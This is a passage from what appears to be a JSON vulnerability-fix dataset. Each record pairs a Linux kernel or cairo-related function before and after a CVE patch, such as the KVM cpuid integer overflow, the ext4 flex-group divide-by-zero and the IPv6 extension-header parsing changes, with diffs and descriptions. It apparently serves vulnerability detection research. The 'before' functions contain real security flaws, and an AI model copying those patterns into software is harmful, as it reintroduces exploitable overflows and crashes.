        "func_before": "static cairo_surface_t *\ncreate_surface_from_thumbnail_data (guchar *data,\n\t\t\t\t    gint    width,\n\t\t\t\t    gint    height,\n\t\t\t\t    gint    rowstride)\n{\n  guchar *cairo_pixels;\n  cairo_surface_t *surface;\n  static cairo_user_data_key_t key;\n  int j;\n\n  cairo_pixels = (guchar *)g_malloc (4 * width * height);\n  surface = cairo_image_surface_create_for_data ((unsigned char *)cairo_pixels,\n\t\t\t\t\t\t CAIRO_FORMAT_RGB24,\n\t\t\t\t\t\t width, height, 4 * width);\n  cairo_surface_set_user_data (surface, &key,\n\t\t\t       cairo_pixels, (cairo_destroy_func_t)g_free);\n\n  for (j = height; j; j--) {\n    guchar *p = data;\n    guchar *q = cairo_pixels;\n    guchar *end = p + 3 * width;\n\t  \n    while (p < end) {\n#if G_BYTE_ORDER == G_LITTLE_ENDIAN\n      q[0] = p[2];\n      q[1] = p[1];\n      q[2] = p[0];\n#else\t  \n      q[1] = p[0];\n      q[2] = p[1];\n      q[3] = p[2];\n#endif\n      p += 3;\n      q += 4;\n    }\n\n    data += rowstride;\n    cairo_pixels += 4 * width;\n  }\n\n  return surface;\n}",
        "func": "static cairo_surface_t *\ncreate_surface_from_thumbnail_data (guchar *data,\n\t\t\t\t    gint    width,\n\t\t\t\t    gint    height,\n\t\t\t\t    gint    rowstride)\n{\n  guchar *cairo_pixels;\n  gint cairo_stride;\n  cairo_surface_t *surface;\n  int j;\n\n  surface = cairo_image_surface_create (CAIRO_FORMAT_RGB24, width, height);\n  if (cairo_surface_status (surface))\n    return NULL;\n\n  cairo_pixels = cairo_image_surface_get_data (surface);\n  cairo_stride = cairo_image_surface_get_stride (surface);\n\n  for (j = height; j; j--) {\n    guchar *p = data;\n    guchar *q = cairo_pixels;\n    guchar *end = p + 3 * width;\n\n    while (p < end) {\n#if G_BYTE_ORDER == G_LITTLE_ENDIAN\n      q[0] = p[2];\n      q[1] = p[1];\n      q[2] = p[0];\n#else\n      q[1] = p[0];\n      q[2] = p[1];\n      q[3] = p[2];\n#endif\n      p += 3;\n      q += 4;\n    }\n\n    data += rowstride;\n    cairo_pixels += cairo_stride;\n  }\n\n  return surface;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -5,28 +5,28 @@\n \t\t\t\t    gint    rowstride)\n {\n   guchar *cairo_pixels;\n+  gint cairo_stride;\n   cairo_surface_t *surface;\n-  static cairo_user_data_key_t key;\n   int j;\n \n-  cairo_pixels = (guchar *)g_malloc (4 * width * height);\n-  surface = cairo_image_surface_create_for_data ((unsigned char *)cairo_pixels,\n-\t\t\t\t\t\t CAIRO_FORMAT_RGB24,\n-\t\t\t\t\t\t width, height, 4 * width);\n-  cairo_surface_set_user_data (surface, &key,\n-\t\t\t       cairo_pixels, (cairo_destroy_func_t)g_free);\n+  surface = cairo_image_surface_create (CAIRO_FORMAT_RGB24, width, height);\n+  if (cairo_surface_status (surface))\n+    return NULL;\n+\n+  cairo_pixels = cairo_image_surface_get_data (surface);\n+  cairo_stride = cairo_image_surface_get_stride (surface);\n \n   for (j = height; j; j--) {\n     guchar *p = data;\n     guchar *q = cairo_pixels;\n     guchar *end = p + 3 * width;\n-\t  \n+\n     while (p < end) {\n #if G_BYTE_ORDER == G_LITTLE_ENDIAN\n       q[0] = p[2];\n       q[1] = p[1];\n       q[2] = p[0];\n-#else\t  \n+#else\n       q[1] = p[0];\n       q[2] = p[1];\n       q[3] = p[2];\n@@ -36,7 +36,7 @@\n     }\n \n     data += rowstride;\n-    cairo_pixels += 4 * width;\n+    cairo_pixels += cairo_stride;\n   }\n \n   return surface;",
        "diff_line_info": {
            "deleted_lines": [
                "  static cairo_user_data_key_t key;",
                "  cairo_pixels = (guchar *)g_malloc (4 * width * height);",
                "  surface = cairo_image_surface_create_for_data ((unsigned char *)cairo_pixels,",
                "\t\t\t\t\t\t CAIRO_FORMAT_RGB24,",
                "\t\t\t\t\t\t width, height, 4 * width);",
                "  cairo_surface_set_user_data (surface, &key,",
                "\t\t\t       cairo_pixels, (cairo_destroy_func_t)g_free);",
                "\t  ",
                "#else\t  ",
                "    cairo_pixels += 4 * width;"
            ],
            "added_lines": [
                "  gint cairo_stride;",
                "  surface = cairo_image_surface_create (CAIRO_FORMAT_RGB24, width, height);",
                "  if (cairo_surface_status (surface))",
                "    return NULL;",
                "",
                "  cairo_pixels = cairo_image_surface_get_data (surface);",
                "  cairo_stride = cairo_image_surface_get_stride (surface);",
                "",
                "#else",
                "    cairo_pixels += cairo_stride;"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-3638",
        "func_name": "torvalds/linux/kvm_dev_ioctl_get_supported_cpuid",
        "description": "Integer overflow in the kvm_dev_ioctl_get_supported_cpuid function in arch/x86/kvm/x86.c in the KVM subsystem in the Linux kernel before 2.6.31.4 allows local users to have an unspecified impact via a KVM_GET_SUPPORTED_CPUID request to the kvm_arch_dev_ioctl function.",
        "git_url": "http://git.kernel.org/?p=linux/kernel/git/torvalds/linux.git;a=commit;h=6a54435560efdab1a08f429a954df4d6c740bddf",
        "commit_title": "The number of entries is multiplied by the entry size, which can",
        "commit_text": "overflow on 32-bit hosts.  Bound the entry count instead.  Cc: stable@kernel.org ",
        "func_before": "static int kvm_dev_ioctl_get_supported_cpuid(struct kvm_cpuid2 *cpuid,\n\t\t\t\t     struct kvm_cpuid_entry2 __user *entries)\n{\n\tstruct kvm_cpuid_entry2 *cpuid_entries;\n\tint limit, nent = 0, r = -E2BIG;\n\tu32 func;\n\n\tif (cpuid->nent < 1)\n\t\tgoto out;\n\tr = -ENOMEM;\n\tcpuid_entries = vmalloc(sizeof(struct kvm_cpuid_entry2) * cpuid->nent);\n\tif (!cpuid_entries)\n\t\tgoto out;\n\n\tdo_cpuid_ent(&cpuid_entries[0], 0, 0, &nent, cpuid->nent);\n\tlimit = cpuid_entries[0].eax;\n\tfor (func = 1; func <= limit && nent < cpuid->nent; ++func)\n\t\tdo_cpuid_ent(&cpuid_entries[nent], func, 0,\n\t\t\t     &nent, cpuid->nent);\n\tr = -E2BIG;\n\tif (nent >= cpuid->nent)\n\t\tgoto out_free;\n\n\tdo_cpuid_ent(&cpuid_entries[nent], 0x80000000, 0, &nent, cpuid->nent);\n\tlimit = cpuid_entries[nent - 1].eax;\n\tfor (func = 0x80000001; func <= limit && nent < cpuid->nent; ++func)\n\t\tdo_cpuid_ent(&cpuid_entries[nent], func, 0,\n\t\t\t     &nent, cpuid->nent);\n\tr = -E2BIG;\n\tif (nent >= cpuid->nent)\n\t\tgoto out_free;\n\n\tr = -EFAULT;\n\tif (copy_to_user(entries, cpuid_entries,\n\t\t\t nent * sizeof(struct kvm_cpuid_entry2)))\n\t\tgoto out_free;\n\tcpuid->nent = nent;\n\tr = 0;\n\nout_free:\n\tvfree(cpuid_entries);\nout:\n\treturn r;\n}",
        "func": "static int kvm_dev_ioctl_get_supported_cpuid(struct kvm_cpuid2 *cpuid,\n\t\t\t\t     struct kvm_cpuid_entry2 __user *entries)\n{\n\tstruct kvm_cpuid_entry2 *cpuid_entries;\n\tint limit, nent = 0, r = -E2BIG;\n\tu32 func;\n\n\tif (cpuid->nent < 1)\n\t\tgoto out;\n\tif (cpuid->nent > KVM_MAX_CPUID_ENTRIES)\n\t\tcpuid->nent = KVM_MAX_CPUID_ENTRIES;\n\tr = -ENOMEM;\n\tcpuid_entries = vmalloc(sizeof(struct kvm_cpuid_entry2) * cpuid->nent);\n\tif (!cpuid_entries)\n\t\tgoto out;\n\n\tdo_cpuid_ent(&cpuid_entries[0], 0, 0, &nent, cpuid->nent);\n\tlimit = cpuid_entries[0].eax;\n\tfor (func = 1; func <= limit && nent < cpuid->nent; ++func)\n\t\tdo_cpuid_ent(&cpuid_entries[nent], func, 0,\n\t\t\t     &nent, cpuid->nent);\n\tr = -E2BIG;\n\tif (nent >= cpuid->nent)\n\t\tgoto out_free;\n\n\tdo_cpuid_ent(&cpuid_entries[nent], 0x80000000, 0, &nent, cpuid->nent);\n\tlimit = cpuid_entries[nent - 1].eax;\n\tfor (func = 0x80000001; func <= limit && nent < cpuid->nent; ++func)\n\t\tdo_cpuid_ent(&cpuid_entries[nent], func, 0,\n\t\t\t     &nent, cpuid->nent);\n\tr = -E2BIG;\n\tif (nent >= cpuid->nent)\n\t\tgoto out_free;\n\n\tr = -EFAULT;\n\tif (copy_to_user(entries, cpuid_entries,\n\t\t\t nent * sizeof(struct kvm_cpuid_entry2)))\n\t\tgoto out_free;\n\tcpuid->nent = nent;\n\tr = 0;\n\nout_free:\n\tvfree(cpuid_entries);\nout:\n\treturn r;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -7,6 +7,8 @@\n \n \tif (cpuid->nent < 1)\n \t\tgoto out;\n+\tif (cpuid->nent > KVM_MAX_CPUID_ENTRIES)\n+\t\tcpuid->nent = KVM_MAX_CPUID_ENTRIES;\n \tr = -ENOMEM;\n \tcpuid_entries = vmalloc(sizeof(struct kvm_cpuid_entry2) * cpuid->nent);\n \tif (!cpuid_entries)",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "\tif (cpuid->nent > KVM_MAX_CPUID_ENTRIES)",
                "\t\tcpuid->nent = KVM_MAX_CPUID_ENTRIES;"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-4307",
        "func_name": "torvalds/linux/ext4_fill_flex_info",
        "description": "The ext4_fill_flex_info function in fs/ext4/super.c in the Linux kernel before 2.6.32-git6 allows user-assisted remote attackers to cause a denial of service (divide-by-zero error and panic) via a malformed ext4 filesystem containing a super block with a large FLEX_BG group size (aka s_log_groups_per_flex value).",
        "git_url": "http://git.kernel.org/?p=linux/kernel/git/torvalds/linux.git;a=commit;h=503358ae01b70ce6909d19dd01287093f6b6271c",
        "commit_title": "If s_log_groups_per_flex is greater than 31, then groups_per_flex will",
        "commit_text": "will overflow and cause a divide by zero error.  This can cause kernel BUG if such a file system is mounted.  Thanks to Nageswara R Sastry for analyzing the failure and providing an initial patch.  http://bugzilla.kernel.org/show_bug.cgi?id=14287  Cc: stable@kernel.org ",
        "func_before": "static int ext4_fill_flex_info(struct super_block *sb)\n{\n\tstruct ext4_sb_info *sbi = EXT4_SB(sb);\n\tstruct ext4_group_desc *gdp = NULL;\n\text4_group_t flex_group_count;\n\text4_group_t flex_group;\n\tint groups_per_flex = 0;\n\tsize_t size;\n\tint i;\n\n\tif (!sbi->s_es->s_log_groups_per_flex) {\n\t\tsbi->s_log_groups_per_flex = 0;\n\t\treturn 1;\n\t}\n\n\tsbi->s_log_groups_per_flex = sbi->s_es->s_log_groups_per_flex;\n\tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;\n\n\t/* We allocate both existing and potentially added groups */\n\tflex_group_count = ((sbi->s_groups_count + groups_per_flex - 1) +\n\t\t\t((le16_to_cpu(sbi->s_es->s_reserved_gdt_blocks) + 1) <<\n\t\t\t      EXT4_DESC_PER_BLOCK_BITS(sb))) / groups_per_flex;\n\tsize = flex_group_count * sizeof(struct flex_groups);\n\tsbi->s_flex_groups = kzalloc(size, GFP_KERNEL);\n\tif (sbi->s_flex_groups == NULL) {\n\t\tsbi->s_flex_groups = vmalloc(size);\n\t\tif (sbi->s_flex_groups)\n\t\t\tmemset(sbi->s_flex_groups, 0, size);\n\t}\n\tif (sbi->s_flex_groups == NULL) {\n\t\text4_msg(sb, KERN_ERR, \"not enough memory for \"\n\t\t\t\t\"%u flex groups\", flex_group_count);\n\t\tgoto failed;\n\t}\n\n\tfor (i = 0; i < sbi->s_groups_count; i++) {\n\t\tgdp = ext4_get_group_desc(sb, i, NULL);\n\n\t\tflex_group = ext4_flex_group(sbi, i);\n\t\tatomic_add(ext4_free_inodes_count(sb, gdp),\n\t\t\t   &sbi->s_flex_groups[flex_group].free_inodes);\n\t\tatomic_add(ext4_free_blks_count(sb, gdp),\n\t\t\t   &sbi->s_flex_groups[flex_group].free_blocks);\n\t\tatomic_add(ext4_used_dirs_count(sb, gdp),\n\t\t\t   &sbi->s_flex_groups[flex_group].used_dirs);\n\t}\n\n\treturn 1;\nfailed:\n\treturn 0;\n}",
        "func": "static int ext4_fill_flex_info(struct super_block *sb)\n{\n\tstruct ext4_sb_info *sbi = EXT4_SB(sb);\n\tstruct ext4_group_desc *gdp = NULL;\n\text4_group_t flex_group_count;\n\text4_group_t flex_group;\n\tint groups_per_flex = 0;\n\tsize_t size;\n\tint i;\n\n\tsbi->s_log_groups_per_flex = sbi->s_es->s_log_groups_per_flex;\n\tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;\n\n\tif (groups_per_flex < 2) {\n\t\tsbi->s_log_groups_per_flex = 0;\n\t\treturn 1;\n\t}\n\n\t/* We allocate both existing and potentially added groups */\n\tflex_group_count = ((sbi->s_groups_count + groups_per_flex - 1) +\n\t\t\t((le16_to_cpu(sbi->s_es->s_reserved_gdt_blocks) + 1) <<\n\t\t\t      EXT4_DESC_PER_BLOCK_BITS(sb))) / groups_per_flex;\n\tsize = flex_group_count * sizeof(struct flex_groups);\n\tsbi->s_flex_groups = kzalloc(size, GFP_KERNEL);\n\tif (sbi->s_flex_groups == NULL) {\n\t\tsbi->s_flex_groups = vmalloc(size);\n\t\tif (sbi->s_flex_groups)\n\t\t\tmemset(sbi->s_flex_groups, 0, size);\n\t}\n\tif (sbi->s_flex_groups == NULL) {\n\t\text4_msg(sb, KERN_ERR, \"not enough memory for \"\n\t\t\t\t\"%u flex groups\", flex_group_count);\n\t\tgoto failed;\n\t}\n\n\tfor (i = 0; i < sbi->s_groups_count; i++) {\n\t\tgdp = ext4_get_group_desc(sb, i, NULL);\n\n\t\tflex_group = ext4_flex_group(sbi, i);\n\t\tatomic_add(ext4_free_inodes_count(sb, gdp),\n\t\t\t   &sbi->s_flex_groups[flex_group].free_inodes);\n\t\tatomic_add(ext4_free_blks_count(sb, gdp),\n\t\t\t   &sbi->s_flex_groups[flex_group].free_blocks);\n\t\tatomic_add(ext4_used_dirs_count(sb, gdp),\n\t\t\t   &sbi->s_flex_groups[flex_group].used_dirs);\n\t}\n\n\treturn 1;\nfailed:\n\treturn 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -8,13 +8,13 @@\n \tsize_t size;\n \tint i;\n \n-\tif (!sbi->s_es->s_log_groups_per_flex) {\n+\tsbi->s_log_groups_per_flex = sbi->s_es->s_log_groups_per_flex;\n+\tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;\n+\n+\tif (groups_per_flex < 2) {\n \t\tsbi->s_log_groups_per_flex = 0;\n \t\treturn 1;\n \t}\n-\n-\tsbi->s_log_groups_per_flex = sbi->s_es->s_log_groups_per_flex;\n-\tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;\n \n \t/* We allocate both existing and potentially added groups */\n \tflex_group_count = ((sbi->s_groups_count + groups_per_flex - 1) +",
        "diff_line_info": {
            "deleted_lines": [
                "\tif (!sbi->s_es->s_log_groups_per_flex) {",
                "",
                "\tsbi->s_log_groups_per_flex = sbi->s_es->s_log_groups_per_flex;",
                "\tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;"
            ],
            "added_lines": [
                "\tsbi->s_log_groups_per_flex = sbi->s_es->s_log_groups_per_flex;",
                "\tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;",
                "",
                "\tif (groups_per_flex < 2) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2005-4886",
        "func_name": "torvalds/linux/is_ineligible",
        "description": "The selinux_parse_skb_ipv6 function in security/selinux/hooks.c in the Linux kernel before 2.6.12-rc4 allows remote attackers to cause a denial of service (OOPS) via vectors associated with an incorrect call to the ipv6_skip_exthdr function.",
        "git_url": "http://git.kernel.org/?p=linux/kernel/git/torvalds/linux.git;a=commit;h=0d3d077cd4f1154e63a9858e47fe3fb1ad0c03e5",
        "commit_title": "The SELinux hooks invoke ipv6_skip_exthdr() with an incorrect",
        "commit_text": "length final argument.  However, the length argument turns out to be superfluous.  I was just reading ipv6_skip_exthdr and it occured to me that we can get rid of len altogether.  The only place where len is used is to check whether the skb has two bytes for ipv6_opt_hdr.  This check is done by skb_header_pointer/skb_copy_bits anyway.  Now it might appear that we've made the code slower by deferring the check to skb_copy_bits.  However, this check should not trigger in the common case so this is OK.  ",
        "func_before": "static int is_ineligible(struct sk_buff *skb)\n{\n\tint ptr = (u8*)(skb->nh.ipv6h+1) - skb->data;\n\tint len = skb->len - ptr;\n\t__u8 nexthdr = skb->nh.ipv6h->nexthdr;\n\n\tif (len < 0)\n\t\treturn 1;\n\n\tptr = ipv6_skip_exthdr(skb, ptr, &nexthdr, len);\n\tif (ptr < 0)\n\t\treturn 0;\n\tif (nexthdr == IPPROTO_ICMPV6) {\n\t\tu8 _type, *tp;\n\t\ttp = skb_header_pointer(skb,\n\t\t\tptr+offsetof(struct icmp6hdr, icmp6_type),\n\t\t\tsizeof(_type), &_type);\n\t\tif (tp == NULL ||\n\t\t    !(*tp & ICMPV6_INFOMSG_MASK))\n\t\t\treturn 1;\n\t}\n\treturn 0;\n}",
        "func": "static int is_ineligible(struct sk_buff *skb)\n{\n\tint ptr = (u8*)(skb->nh.ipv6h+1) - skb->data;\n\tint len = skb->len - ptr;\n\t__u8 nexthdr = skb->nh.ipv6h->nexthdr;\n\n\tif (len < 0)\n\t\treturn 1;\n\n\tptr = ipv6_skip_exthdr(skb, ptr, &nexthdr);\n\tif (ptr < 0)\n\t\treturn 0;\n\tif (nexthdr == IPPROTO_ICMPV6) {\n\t\tu8 _type, *tp;\n\t\ttp = skb_header_pointer(skb,\n\t\t\tptr+offsetof(struct icmp6hdr, icmp6_type),\n\t\t\tsizeof(_type), &_type);\n\t\tif (tp == NULL ||\n\t\t    !(*tp & ICMPV6_INFOMSG_MASK))\n\t\t\treturn 1;\n\t}\n\treturn 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -7,7 +7,7 @@\n \tif (len < 0)\n \t\treturn 1;\n \n-\tptr = ipv6_skip_exthdr(skb, ptr, &nexthdr, len);\n+\tptr = ipv6_skip_exthdr(skb, ptr, &nexthdr);\n \tif (ptr < 0)\n \t\treturn 0;\n \tif (nexthdr == IPPROTO_ICMPV6) {",
        "diff_line_info": {
            "deleted_lines": [
                "\tptr = ipv6_skip_exthdr(skb, ptr, &nexthdr, len);"
            ],
            "added_lines": [
                "\tptr = ipv6_skip_exthdr(skb, ptr, &nexthdr);"
            ]
        }
    },
    {
        "cve_id": "CVE-2005-4886",
        "func_name": "torvalds/linux/icmpv6_notify",
        "description": "The selinux_parse_skb_ipv6 function in security/selinux/hooks.c in the Linux kernel before 2.6.12-rc4 allows remote attackers to cause a denial of service (OOPS) via vectors associated with an incorrect call to the ipv6_skip_exthdr function.",
        "git_url": "http://git.kernel.org/?p=linux/kernel/git/torvalds/linux.git;a=commit;h=0d3d077cd4f1154e63a9858e47fe3fb1ad0c03e5",
        "commit_title": "The SELinux hooks invoke ipv6_skip_exthdr() with an incorrect",
        "commit_text": "length final argument.  However, the length argument turns out to be superfluous.  I was just reading ipv6_skip_exthdr and it occured to me that we can get rid of len altogether.  The only place where len is used is to check whether the skb has two bytes for ipv6_opt_hdr.  This check is done by skb_header_pointer/skb_copy_bits anyway.  Now it might appear that we've made the code slower by deferring the check to skb_copy_bits.  However, this check should not trigger in the common case so this is OK.  ",
        "func_before": "static void icmpv6_notify(struct sk_buff *skb, int type, int code, u32 info)\n{\n\tstruct in6_addr *saddr, *daddr;\n\tstruct inet6_protocol *ipprot;\n\tstruct sock *sk;\n\tint inner_offset;\n\tint hash;\n\tu8 nexthdr;\n\n\tif (!pskb_may_pull(skb, sizeof(struct ipv6hdr)))\n\t\treturn;\n\n\tnexthdr = ((struct ipv6hdr *)skb->data)->nexthdr;\n\tif (ipv6_ext_hdr(nexthdr)) {\n\t\t/* now skip over extension headers */\n\t\tinner_offset = ipv6_skip_exthdr(skb, sizeof(struct ipv6hdr), &nexthdr, skb->len - sizeof(struct ipv6hdr));\n\t\tif (inner_offset<0)\n\t\t\treturn;\n\t} else {\n\t\tinner_offset = sizeof(struct ipv6hdr);\n\t}\n\n\t/* Checkin header including 8 bytes of inner protocol header. */\n\tif (!pskb_may_pull(skb, inner_offset+8))\n\t\treturn;\n\n\tsaddr = &skb->nh.ipv6h->saddr;\n\tdaddr = &skb->nh.ipv6h->daddr;\n\n\t/* BUGGG_FUTURE: we should try to parse exthdrs in this packet.\n\t   Without this we will not able f.e. to make source routed\n\t   pmtu discovery.\n\t   Corresponding argument (opt) to notifiers is already added.\n\t   --ANK (980726)\n\t */\n\n\thash = nexthdr & (MAX_INET_PROTOS - 1);\n\n\trcu_read_lock();\n\tipprot = rcu_dereference(inet6_protos[hash]);\n\tif (ipprot && ipprot->err_handler)\n\t\tipprot->err_handler(skb, NULL, type, code, inner_offset, info);\n\trcu_read_unlock();\n\n\tread_lock(&raw_v6_lock);\n\tif ((sk = sk_head(&raw_v6_htable[hash])) != NULL) {\n\t\twhile((sk = __raw_v6_lookup(sk, nexthdr, daddr, saddr))) {\n\t\t\trawv6_err(sk, skb, NULL, type, code, inner_offset, info);\n\t\t\tsk = sk_next(sk);\n\t\t}\n\t}\n\tread_unlock(&raw_v6_lock);\n}",
        "func": "static void icmpv6_notify(struct sk_buff *skb, int type, int code, u32 info)\n{\n\tstruct in6_addr *saddr, *daddr;\n\tstruct inet6_protocol *ipprot;\n\tstruct sock *sk;\n\tint inner_offset;\n\tint hash;\n\tu8 nexthdr;\n\n\tif (!pskb_may_pull(skb, sizeof(struct ipv6hdr)))\n\t\treturn;\n\n\tnexthdr = ((struct ipv6hdr *)skb->data)->nexthdr;\n\tif (ipv6_ext_hdr(nexthdr)) {\n\t\t/* now skip over extension headers */\n\t\tinner_offset = ipv6_skip_exthdr(skb, sizeof(struct ipv6hdr), &nexthdr);\n\t\tif (inner_offset<0)\n\t\t\treturn;\n\t} else {\n\t\tinner_offset = sizeof(struct ipv6hdr);\n\t}\n\n\t/* Checkin header including 8 bytes of inner protocol header. */\n\tif (!pskb_may_pull(skb, inner_offset+8))\n\t\treturn;\n\n\tsaddr = &skb->nh.ipv6h->saddr;\n\tdaddr = &skb->nh.ipv6h->daddr;\n\n\t/* BUGGG_FUTURE: we should try to parse exthdrs in this packet.\n\t   Without this we will not able f.e. to make source routed\n\t   pmtu discovery.\n\t   Corresponding argument (opt) to notifiers is already added.\n\t   --ANK (980726)\n\t */\n\n\thash = nexthdr & (MAX_INET_PROTOS - 1);\n\n\trcu_read_lock();\n\tipprot = rcu_dereference(inet6_protos[hash]);\n\tif (ipprot && ipprot->err_handler)\n\t\tipprot->err_handler(skb, NULL, type, code, inner_offset, info);\n\trcu_read_unlock();\n\n\tread_lock(&raw_v6_lock);\n\tif ((sk = sk_head(&raw_v6_htable[hash])) != NULL) {\n\t\twhile((sk = __raw_v6_lookup(sk, nexthdr, daddr, saddr))) {\n\t\t\trawv6_err(sk, skb, NULL, type, code, inner_offset, info);\n\t\t\tsk = sk_next(sk);\n\t\t}\n\t}\n\tread_unlock(&raw_v6_lock);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -13,7 +13,7 @@\n \tnexthdr = ((struct ipv6hdr *)skb->data)->nexthdr;\n \tif (ipv6_ext_hdr(nexthdr)) {\n \t\t/* now skip over extension headers */\n-\t\tinner_offset = ipv6_skip_exthdr(skb, sizeof(struct ipv6hdr), &nexthdr, skb->len - sizeof(struct ipv6hdr));\n+\t\tinner_offset = ipv6_skip_exthdr(skb, sizeof(struct ipv6hdr), &nexthdr);\n \t\tif (inner_offset<0)\n \t\t\treturn;\n \t} else {",
        "diff_line_info": {
            "deleted_lines": [
                "\t\tinner_offset = ipv6_skip_exthdr(skb, sizeof(struct ipv6hdr), &nexthdr, skb->len - sizeof(struct ipv6hdr));"
            ],
            "added_lines": [
                "\t\tinner_offset = ipv6_skip_exthdr(skb, sizeof(struct ipv6hdr), &nexthdr);"
            ]
        }
    },
    {
        "cve_id": "CVE-2005-4886",
        "func_name": "torvalds/linux/ipv6_skip_exthdr",
        "description": "The selinux_parse_skb_ipv6 function in security/selinux/hooks.c in the Linux kernel before 2.6.12-rc4 allows remote attackers to cause a denial of service (OOPS) via vectors associated with an incorrect call to the ipv6_skip_exthdr function.",
        "git_url": "http://git.kernel.org/?p=linux/kernel/git/torvalds/linux.git;a=commit;h=0d3d077cd4f1154e63a9858e47fe3fb1ad0c03e5",
        "commit_title": "The SELinux hooks invoke ipv6_skip_exthdr() with an incorrect",
        "commit_text": "length final argument.  However, the length argument turns out to be superfluous.  I was just reading ipv6_skip_exthdr and it occured to me that we can get rid of len altogether.  The only place where len is used is to check whether the skb has two bytes for ipv6_opt_hdr.  This check is done by skb_header_pointer/skb_copy_bits anyway.  Now it might appear that we've made the code slower by deferring the check to skb_copy_bits.  However, this check should not trigger in the common case so this is OK.  ",
        "func_before": "int ipv6_skip_exthdr(const struct sk_buff *skb, int start, u8 *nexthdrp, int len)\n{\n\tu8 nexthdr = *nexthdrp;\n\n\twhile (ipv6_ext_hdr(nexthdr)) {\n\t\tstruct ipv6_opt_hdr _hdr, *hp;\n\t\tint hdrlen;\n\n\t\tif (len < (int)sizeof(struct ipv6_opt_hdr))\n\t\t\treturn -1;\n\t\tif (nexthdr == NEXTHDR_NONE)\n\t\t\treturn -1;\n\t\thp = skb_header_pointer(skb, start, sizeof(_hdr), &_hdr);\n\t\tif (hp == NULL)\n\t\t\tBUG();\n\t\tif (nexthdr == NEXTHDR_FRAGMENT) {\n\t\t\tunsigned short _frag_off, *fp;\n\t\t\tfp = skb_header_pointer(skb,\n\t\t\t\t\t\tstart+offsetof(struct frag_hdr,\n\t\t\t\t\t\t\t       frag_off),\n\t\t\t\t\t\tsizeof(_frag_off),\n\t\t\t\t\t\t&_frag_off);\n\t\t\tif (fp == NULL)\n\t\t\t\treturn -1;\n\n\t\t\tif (ntohs(*fp) & ~0x7)\n\t\t\t\tbreak;\n\t\t\thdrlen = 8;\n\t\t} else if (nexthdr == NEXTHDR_AUTH)\n\t\t\thdrlen = (hp->hdrlen+2)<<2; \n\t\telse\n\t\t\thdrlen = ipv6_optlen(hp); \n\n\t\tnexthdr = hp->nexthdr;\n\t\tlen -= hdrlen;\n\t\tstart += hdrlen;\n\t}\n\n\t*nexthdrp = nexthdr;\n\treturn start;\n}",
        "func": "int ipv6_skip_exthdr(const struct sk_buff *skb, int start, u8 *nexthdrp)\n{\n\tu8 nexthdr = *nexthdrp;\n\n\twhile (ipv6_ext_hdr(nexthdr)) {\n\t\tstruct ipv6_opt_hdr _hdr, *hp;\n\t\tint hdrlen;\n\n\t\tif (nexthdr == NEXTHDR_NONE)\n\t\t\treturn -1;\n\t\thp = skb_header_pointer(skb, start, sizeof(_hdr), &_hdr);\n\t\tif (hp == NULL)\n\t\t\treturn -1;\n\t\tif (nexthdr == NEXTHDR_FRAGMENT) {\n\t\t\tunsigned short _frag_off, *fp;\n\t\t\tfp = skb_header_pointer(skb,\n\t\t\t\t\t\tstart+offsetof(struct frag_hdr,\n\t\t\t\t\t\t\t       frag_off),\n\t\t\t\t\t\tsizeof(_frag_off),\n\t\t\t\t\t\t&_frag_off);\n\t\t\tif (fp == NULL)\n\t\t\t\treturn -1;\n\n\t\t\tif (ntohs(*fp) & ~0x7)\n\t\t\t\tbreak;\n\t\t\thdrlen = 8;\n\t\t} else if (nexthdr == NEXTHDR_AUTH)\n\t\t\thdrlen = (hp->hdrlen+2)<<2; \n\t\telse\n\t\t\thdrlen = ipv6_optlen(hp); \n\n\t\tnexthdr = hp->nexthdr;\n\t\tstart += hdrlen;\n\t}\n\n\t*nexthdrp = nexthdr;\n\treturn start;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,4 +1,4 @@\n-int ipv6_skip_exthdr(const struct sk_buff *skb, int start, u8 *nexthdrp, int len)\n+int ipv6_skip_exthdr(const struct sk_buff *skb, int start, u8 *nexthdrp)\n {\n \tu8 nexthdr = *nexthdrp;\n \n@@ -6,13 +6,11 @@\n \t\tstruct ipv6_opt_hdr _hdr, *hp;\n \t\tint hdrlen;\n \n-\t\tif (len < (int)sizeof(struct ipv6_opt_hdr))\n-\t\t\treturn -1;\n \t\tif (nexthdr == NEXTHDR_NONE)\n \t\t\treturn -1;\n \t\thp = skb_header_pointer(skb, start, sizeof(_hdr), &_hdr);\n \t\tif (hp == NULL)\n-\t\t\tBUG();\n+\t\t\treturn -1;\n \t\tif (nexthdr == NEXTHDR_FRAGMENT) {\n \t\t\tunsigned short _frag_off, *fp;\n \t\t\tfp = skb_header_pointer(skb,\n@@ -32,7 +30,6 @@\n \t\t\thdrlen = ipv6_optlen(hp); \n \n \t\tnexthdr = hp->nexthdr;\n-\t\tlen -= hdrlen;\n \t\tstart += hdrlen;\n \t}\n ",
        "diff_line_info": {
            "deleted_lines": [
                "int ipv6_skip_exthdr(const struct sk_buff *skb, int start, u8 *nexthdrp, int len)",
                "\t\tif (len < (int)sizeof(struct ipv6_opt_hdr))",
                "\t\t\treturn -1;",
                "\t\t\tBUG();",
                "\t\tlen -= hdrlen;"
            ],
            "added_lines": [
                "int ipv6_skip_exthdr(const struct sk_buff *skb, int start, u8 *nexthdrp)",
                "\t\t\treturn -1;"
            ]
        }
    },
    {
        "cve_id": "CVE-2005-4886",
        "func_name": "torvalds/linux/selinux_parse_skb_ipv6",
        "description": "The selinux_parse_skb_ipv6 function in security/selinux/hooks.c in the Linux kernel before 2.6.12-rc4 allows remote attackers to cause a denial of service (OOPS) via vectors associated with an incorrect call to the ipv6_skip_exthdr function.",
        "git_url": "http://git.kernel.org/?p=linux/kernel/git/torvalds/linux.git;a=commit;h=0d3d077cd4f1154e63a9858e47fe3fb1ad0c03e5",
